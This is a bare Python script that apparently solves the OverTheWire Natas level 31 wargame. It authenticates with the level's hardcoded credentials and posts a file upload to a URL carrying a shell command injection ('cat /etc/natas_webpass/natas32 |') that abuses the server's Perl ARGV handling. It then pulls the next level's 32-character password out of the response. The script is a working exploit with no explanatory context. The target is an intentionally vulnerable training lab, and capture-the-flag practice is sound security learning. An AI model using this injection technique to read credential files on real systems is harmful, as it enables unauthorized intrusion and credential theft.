#!/usr/bin python

import re
import os.path
import requests
from requests.auth import HTTPBasicAuth

session = requests.Session()

auth = HTTPBasicAuth('natas31', 'hay7aecuungiuKaezuathuk9biin0pu1')
url = 'http://natas31.natas.labs.overthewire.org/'
payload = url + '? cat /etc/natas_webpass/natas32 |'

if not os.path.exists('./natas32.csv'):
    with open('./natas32.csv', 'w') as f:
        f.write('temp')

csv = { 'file': open('./natas32.csv', 'rb')}

resp = requests.post(payload, files=csv, data={'file': 'ARGV', 'submit': 'Upload'}, auth=auth)
page = resp.text

if os.path.isfile('./natas32.csv'):
    os.remove('./natas32.csv')

x = re.findall("([a-zA-Z0-9]{32})" , page)
print(x[-1])